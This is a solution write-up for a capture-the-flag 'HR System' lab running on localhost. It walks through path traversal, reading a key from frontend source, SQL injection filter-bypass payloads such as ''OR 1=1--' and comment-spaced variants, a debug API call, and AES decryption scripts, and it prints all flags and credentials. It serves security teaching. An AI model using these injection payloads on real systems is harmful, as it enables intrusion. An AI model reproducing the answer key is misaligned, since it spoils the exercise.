# CTF 3: HR System Solution

## Credentials
- `abcd12` / `RVIFLBfM`
- `efgh34` / `bcgxO1ZkSle`
- `ijkl56` / `kH0g5imYtZ`

---

## Flag 1: Path Traversal

1. Login at http://localhost:5174
2. Inspect Dashboard page source (Ctrl+U or View Source)
3. Find HTML comment: `<!-- TODO: Fix broken admin link - /admin/../../flag should redirect properly -->`
4. Navigate to: `http://localhost:5174/flag`

**Flag:** `durham-hr{w3lc0m3_t0_hr_syst3m}`

---

## Flag 2: Source Code Discovery

1. Open DevTools (F12) → Sources tab
2. Navigate to: `src/utils/legacyAuth.ts`
3. Find key in comments: `CTF_2026_SECRET_KEY_XJ9K2L`

**Flag 2 (Decryption Key):** `CTF_2026_SECRET_KEY_XJ9K2L`

---

## Flag 3: SQL Injection

The employee search filters basic injection like `' OR 1=1--` but misses no-space variants.

**Blocked:** `' OR 1=1--` (space after quote)

**Working Payloads:**
- `'OR 1=1--` (no space after quote)
- `'/**/OR/**/1=1--` (comment-based)

**Steps:**

1. Go to Employees page
2. Enter payload in search: `'OR 1=1--`
3. Returns all 4 employees including FLAG012:

```json
{
  "employee_id": "FLAG012",
  "username": "flag12",
  "notes": "AES-256-CBC encrypted data: 2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819 (hint: check legacy code for the key)"
}
```

---

## Flag 4: API Exploitation + Decryption

### Step 1: Get Full Credentials

**Hint in:** `frontend/src/api/client.ts` shows debug endpoint

**Exploit:**
```bash
# Get token
TOKEN=$(curl -s -X POST http://127.0.0.1:8004/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"abcd12","password":"RVIFLBfM"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# Query debug endpoint
curl "http://127.0.0.1:8004/api/debug/config?user=flag12" \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{
  "user": "flag12",
  "config": {
    "notes": "AES-256-CBC encrypted data: 2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819 (hint: check legacy code for the key)"
  }
}
```

### Step 2: Decrypt Final Flag

**Node.js:**
```javascript
const crypto = require('crypto');

const encrypted = '2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819';
const key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L';

const [ivBase64, ciphertext] = encrypted.split(':');
const key = crypto.createHash('sha256').update(key_passphrase).digest();
const iv = Buffer.from(ivBase64, 'base64');
const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);

let decrypted = decipher.update(ciphertext, 'base64', 'utf8');
decrypted += decipher.final('utf8');
console.log(decrypted);
```

**Python:**
```python
from Crypto.Cipher import AES
import hashlib, base64

encrypted = '2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819'
key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L'

iv_b64, ciphertext = encrypted.split(':')
key = hashlib.sha256(key_passphrase.encode()).digest()
iv = base64.b64decode(iv_b64)
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(base64.b64decode(ciphertext))
print(decrypted.decode('utf-8').rstrip('\x00'))
```

**Flag 4:** `durham-hr{c3f8a12b4d7e9056fa21_flag12}`

---

## Summary

| Flag | Technique | Result |
|------|-----------|--------|
| 1 | Path traversal | `durham-hr{w3lc0m3_t0_hr_syst3m}` |
| 2 | Source code inspection | `CTF_2026_SECRET_KEY_XJ9K2L` |
| 3 | SQL injection | Found FLAG012 + encrypted data |
| 4 | Debug API + AES decrypt | `durham-hr{c3f8a12b4d7e9056fa21_flag12}` |
```

**Decryption Script (Python):**
```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import base64

encrypted_data = '2Mc2NehcojWoJDxQfeZmAQ==:n9huRl/J+s87oF1G8uJD5emX7W5XH0O7Jh+vL1Eq9v3xtB/FMjflNbU2gm8nk819'
passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L'

iv_b64, ciphertext_b64 = encrypted_data.split(':')
iv = base64.b64decode(iv_b64)
ciphertext = base64.b64decode(ciphertext_b64)

# Derive key using SHA256
key = SHA256.new(passphrase.encode()).digest()

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)

# Remove PKCS7 padding
pad_len = decrypted[-1]
decrypted = decrypted[:-pad_len].decode('utf-8')

print('Decrypted flag:', decrypted)
```

**Online Alternative:**
Use CyberChef with:
1. From Base64 (for IV and ciphertext separately)
2. AES Decrypt with CBC mode
3. Key: SHA256 hash of `CTF_2026_SECRET_KEY_XJ9K2L`

## Final Flag

```
durham-hr{c3f8a12b4d7e9056fa21_flag12}
```

## Summary of Techniques Used

| Stage | Technique | Skill Level |
|-------|-----------|-------------|
| 1 | Basic authentication | Beginner |
| 2 | Source code analysis | Beginner-Intermediate |
| 3 | SQL Injection (filter bypass) | Intermediate-Advanced |
| 4 | AES-256-CBC decryption | Intermediate |

## Key Vulnerabilities

1. **Information Disclosure**: Encryption key stored in frontend source code
2. **SQL Injection**: Bypassable filter using no-space technique
3. **Hidden Data**: Employee visible in count but filtered from list
